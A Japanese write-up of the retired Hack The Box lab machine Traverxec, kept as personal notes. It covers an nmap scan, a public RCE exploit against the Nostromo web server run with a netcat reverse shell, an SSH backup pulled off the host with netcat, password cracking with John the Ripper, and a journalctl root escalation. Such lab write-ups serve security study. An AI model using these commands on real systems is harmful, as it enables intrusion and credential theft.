# はじめに
HackTheBoxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
GitHub(ペネトレーションテスト用チートシート):  
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet  
Twitter:@yukitsukai1731

# Traverxec
![スクリーンショット 2020-09-02 16.57.53.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e99c556f-2f9b-be62-3361-0a2baccea0a0.png)

HackTheBox公式より
Traverxec is an easy Linux machine that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user david. A bash script in the user's home directory reveals that the user can execute journalctl as root. This is exploited to spawn a root shell.

Traverxecは、リモートコード実行(RCE)に脆弱なNostromo Webサーバを搭載した簡単なLinuxマシンです。Webサーバの設定ファイルを見ると、SSHの資格情報にたどり着き、ユーザーのdavidに横移動できるようになっています。ユーザーのホームディレクトリにある bash スクリプトから、ユーザーが root として journalctl を実行できることがわかります。これは root シェルを生成するために悪用されています。

# Recon(偵察)
Access(10.10.10.98)に対して、スキャンを行います。  
まずnmapでスキャンを開始します。

## nmap 

```
nmap -sC -sV -oN nmap/initial 10.10.10.165
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -p-...全ポートスキャン
- -oN...通常出力

```
# Nmap 7.80 scan initiated Mon Aug 31 04:08:37 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 31 04:09:11 2020 -- 1 IP address (1 host up) scanned in 33.97 seconds
```

この結果から、22,80番ポートが空いていることが分かります。  
まずは80番ポートを確認してみますが、特にこれといった情報は得られませんでした。
![スクリーンショット 2020-08-31 17.21.07.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e614070c-dac8-4193-c6a6-a55c466dc1b4.png)

次に80番ポートで動作しているサービスに注目します。nostromo 1.9.6というものが動作していることがnmapの結果から確認することができます。

## searchsploit
searchsploitでnostromo 1.9.6について検索してみます。
結果、RCE（Remoto Code Execution）が可能なexploitがヒットしました。
今回はこれを用いて侵入を試みます。
![スクリーンショット 2020-08-31 17.19.42.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4d64bd24-103b-4b8b-e0ea-e38c277e542e.png)

```
searchsploit -m multiple/remote/47837.py
mv 47837.py cve2019-16278.py
```
# exploitation(侵入)
使用方法は\<Target_ip>,\<Target_port>,\<Command>を指定するだけで良いようです。
![スクリーンショット 2020-08-31 17.22.45.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/f1378e00-f610-8b9e-6b3b-9905e89ed32c.png)
netcatで通信を待ち受けます。

```
nc -lvnp 4444
```

そして下記のコードを実行します。

```
python cve2019-16278.py 10.10.10.165 80 "nc 10.10.14.2 4444 -e /bin/bash"
```

これで画像のようにシェルを取得することができます。
またこのままだとシェルが使いにくいので、より使いやすいシェルを取得します。

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![スクリーンショット 2020-08-31 17.38.35.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1a95f2a3-4bc5-4779-82d7-42bad74151e3.png)

# Lateral movement(横展開)
現在の権限だとuser.txtを取得することができないので、別のユーザ権限を取得する必要があります。  
linpeas.shを使用して横展開に利用できる認証情報を探します。  
まずはTraverxecにlinepeas.shを転送します。

```
kali@kali:~/pentest/priv/linux/linPEAS$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

次にtraverxecでwgetを使用し、linpeas.shを受け取って実行します。

```
www-data@travexec:/tmp$wget http://10.10.14.2:8888/linpeas.sh
www-data@travexec:/tmp$chmod 755 linpeas.sh
www-data@travexec:/tmp$./linpeas.sh
```

![スクリーンショット 2020-08-31 18.09.42.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a7c8acaf-b5f5-a6d5-4bc4-cf9213f2e460.png)

特に下記の.htpasswdファイルについて気になります。
![スクリーンショット 2020-08-31 18.14.28.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e66b8176-27aa-728d-723a-13731e1f0847.png)
閲覧するとパスワードハッシュ情報を取得することができます。
![スクリーンショット 2020-09-02 17.34.39.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/39b7ef60-53e4-4379-891a-ecee264ef816.png)
このパスワードハッシュをJohnTheRipperを利用してパスワードクラックを行うと、Nowonly4meというパスワードを得ることができます。
![スクリーンショット 2020-09-02 16.53.15.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/feb79f57-f3d2-4f17-bd0b-58a67230bce8.png)
この情報を使用して、sshでログインを試みますが、ログインすることはできません。  
おそらくこのパスワードはWebサーバの管理者パスワードでsshに使い回しなどはされていませんでした。  
/var/nostromo/confにはもう一つ気になるnhttpd.confファイルがあります。  
中をみてみるとホームディレクトリについて明記されています。
![スクリーンショット 2020-08-31 18.17.07.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4d3e9d56-4b63-a119-4cd0-5d0030a107ad.png)

nostromoのmanページを見てみると、http\://10.10.10.165/~david/のようにアクセスすることでユーザのホームディレクトリにアクセスできることが分かります。  
参照：http://www.nazgul.ch/dev/nostromo_man.html
実際にブラウザに入力してアクセスしてみます。
![スクリーンショット 2020-09-02 17.46.29.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c7079639-a998-d5bd-7751-007048ae2443.png)
Private spaceと記載されたページが表示されます。  
これらの情報からコンソールからも/home/david/public_wwwフォルダにアクセスしてみるとprotected-file-areaというディレクトリが見つかり、その中にbackup-ssh-identity-files.tgzといういかにも使えそうなファイルを取得することができます。
![スクリーンショット 2020-09-02 17.59.10.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/16cbf39b-030e-4823-e575-f95a36df0bbd.png)
このファイルをnetcatを使用して共有します。

```
nc -lvnp 1337 > backup_ssh.tgz
```

```
nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```

ちなみに、netcatを使用しなくともブラウザからhttp\://10.10.10.165/~david/protected-file-areaにアクセスしてみると、認証フォームが出てくるので先ほど入手したユーザ名:david、パスワード:Nowonly4meを利用するとログインすることができます。
![スクリーンショット 2020-09-02 17.49.36.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/5a203f3c-db0f-2e81-d9a1-f592af84c076.png)

![スクリーンショット 2020-09-02 17.50.07.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2ca730e8-edd4-bb74-20e8-33c92f778a08.png)

```
tar -xvf backup_ssh.tgz
```

取得したファイルを解凍すると、sshに関する鍵が見つかります。
しかし秘密鍵は暗号化されており、パスワードが必要でした。
![スクリーンショット 2020-09-02 18.03.32.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/0d9b00e8-0189-9713-9170-a04e05adeafc.png)
もう一度JohnTheRipperを使用してパスワードクラックを行います。まずはssh2johnでRSA鍵からハッシュを抽出してから、johnを使用してパスワードをクラックします。

```
/usr/share/john/ssh2john.py id_rsa > david_ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt david_ssh.hash
```

![スクリーンショット 2020-09-02 14.21.36.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/cde66a5b-a1a5-558a-b107-182b1057c968.png)

結果、hunterというパスワードを取得することができ、それを使用することでdavidでログインすることができます。


# Privileges Escalation(権限昇格)
davidでログインするとbinディレクトリが配置されており、中にはserver-stats.shというスクリプトを見つけることができます。
![スクリーンショット 2020-09-03 16.25.34.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a284b90a-220c-5980-0b14-45e4a37481f0.png)

このスクリプトの最後の行でsudo権限でjournalctlを使用しnostromoサービスのログの最後5行を出力していることが分かります。
![スクリーンショット 2020-09-03 16.26.42.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/fdd57e3e-a532-084e-35d4-e74e397040b1.png)
![スクリーンショット 2020-09-03 16.38.20.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a4d29d54-5337-e312-52b5-79d70cc5d70a.png)
journalctlを使用して権限昇格できないかGoogleで検索したところ以下の情報が見つかりました。
こちらを利用して権限昇格を試みます。
参考:https://gtfobins.github.io/gtfobins/journalctl/
![スクリーンショット 2020-09-03 16.33.37.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/840564f5-7c71-14a8-0798-2e822e7ff16e.png)
![スクリーンショット 2020-09-03 16.34.55.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b3464963-ef4e-e869-9156-2e51919fac6f.png)
お疲れ様でした。  
root権限を取得することができました。